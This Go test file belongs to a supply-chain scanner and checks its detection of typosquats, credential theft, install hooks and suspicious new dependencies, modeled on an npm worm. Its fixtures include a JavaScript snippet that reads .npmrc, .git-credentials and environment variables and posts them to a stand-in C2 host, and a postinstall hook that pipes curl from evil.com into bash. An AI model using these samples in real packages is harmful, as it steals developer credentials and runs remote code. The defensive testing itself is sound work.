package scanner

import (
	"strings"
	"testing"

	"github.com/falcn-io/falcn/internal/detector"
	"github.com/falcn-io/falcn/pkg/types"
)

// Tests based on the SANDWORM_MODE npm worm (February 2026).
// Typosquats: claud-code, cloude-code, suport-color, veim.
// Steals npm tokens, GitHub tokens, env vars; self-propagates.

func TestSandworm_TyposquatDetection(t *testing.T) {
	engine := detector.New(nil)

	// Provide the popular packages directly (since the JSON file path is relative
	// to project root, not test working directory).
	popularNPM := []string{
		"react", "express", "lodash", "axios", "chalk", "supports-color",
		"claude-code", "vim", "cross-env", "nodemon", "typescript", "webpack",
		"eslint", "jest", "moment", "vue", "angular", "next",
	}

	tests := []struct {
		name     string
		pkg      string
		registry string
		wantHit  bool
	}{
		{"claud-code typosquat", "claud-code", "npm", true},
		{"cloude-code typosquat", "cloude-code", "npm", true},
		{"suport-color typosquat", "suport-color", "npm", true},
		// "veim" vs "vim" — too short for edit-distance to trigger (3 vs 4 chars).
		// This is a known limitation for very short package names.
		{"veim near-miss (too short for edit distance)", "veim", "npm", false},
		{"legitimate express", "express", "npm", false},
		{"legitimate react", "react", "npm", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dep := types.Dependency{
				Name:     tt.pkg,
				Version:  "unknown",
				Registry: tt.registry,
			}
			threats, _ := engine.AnalyzeDependency(dep, popularNPM, &detector.Options{
				SimilarityThreshold: 0.75,
				DeepAnalysis:        true,
			})

			hasHit := len(threats) > 0
			if tt.wantHit && !hasHit {
				t.Errorf("Expected threat for '%s' but got none", tt.pkg)
			}
			if !tt.wantHit && hasHit {
				t.Errorf("False positive: '%s' should not trigger, got: %s", tt.pkg, threats[0].Type)
			}
			if hasHit {
				t.Logf("'%s': type=%s, confidence=%.2f, similarTo=%s",
					tt.pkg, threats[0].Type, threats[0].Confidence, threats[0].SimilarTo)
			}
		})
	}
}

func TestSandworm_TokenExfiltration(t *testing.T) {
	cs := NewContentScanner()
	// Simulates SANDWORM stealing npm and GitHub tokens
	content := `
const fs = require('fs');
const https = require('https');

// Steal npm token
const npmrc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
const gitCreds = fs.readFileSync(require('os').homedir() + '/.git-credentials', 'utf8');

// Exfiltrate
const data = JSON.stringify({
    npm_token: npmrc,
    git_creds: gitCreds,
    env: process.env
});

const req = https.request({
    hostname: 'evil-c2.example.com',
    path: '/collect',
    method: 'POST',
    headers: {'Content-Type': 'application/json'}
}, () => {});
req.write(data);
req.end();
`
	// Should detect credential harvesting
	credThreats := cs.detectCredentialHarvesting(content)
	if len(credThreats) == 0 {
		t.Error("Should detect credential harvesting (.npmrc, .git-credentials)")
	}

	// Should detect compound behavior (credential read + network)
	compoundThreats := cs.detectCompoundBehaviors(content)
	if len(compoundThreats) == 0 {
		t.Error("Should detect compound behavior (credential + network exfiltration)")
	}
}

func TestSandworm_PostinstallHook(t *testing.T) {
	cs := NewContentScanner()
	// Package.json with malicious postinstall
	content := `{
    "name": "claud-code",
    "version": "0.2.1",
    "scripts": {
        "postinstall": "node -e \"require('child_process').execSync('curl https://evil.com/worm.sh | bash')\""
    }
}`
	hooks := extractInstallHooks([]byte(content))
	if len(hooks) == 0 {
		t.Fatal("Should extract postinstall hook")
	}
	if !strings.Contains(hooks[0], "curl") {
		t.Error("Hook should contain curl command")
	}

	// Content scan should detect suspicious patterns
	patterns := cs.detectSuspiciousPatterns(content)
	t.Logf("Detected patterns: %v", patterns)
}

func TestSandworm_DependencyDiff(t *testing.T) {
	// Test the dependency diff analyzer catches newly added suspicious deps
	analyzer := NewDependencyDiffAnalyzer(nil)

	// Simulate a stable package suddenly adding a suspicious new dep
	previousDeps := []string{"lodash", "express", "body-parser", "cors"}
	currentDeps := []string{"lodash", "express", "body-parser", "cors", "plain-crypto-js"}

	result := analyzer.AnalyzeDiff(currentDeps, previousDeps, "axios", "npm")
	if len(result.Added) != 1 {
		t.Fatalf("Expected 1 added dep, got %d", len(result.Added))
	}
	if result.Added[0] != "plain-crypto-js" {
		t.Errorf("Expected 'plain-crypto-js' as added dep, got '%s'", result.Added[0])
	}
	if len(result.Threats) == 0 {
		t.Fatal("Should generate threat for newly added dependency")
	}
	if result.Threats[0].Type != types.ThreatTypeDependencyDiffAnomaly {
		t.Errorf("Expected ThreatTypeDependencyDiffAnomaly, got %s", result.Threats[0].Type)
	}
}
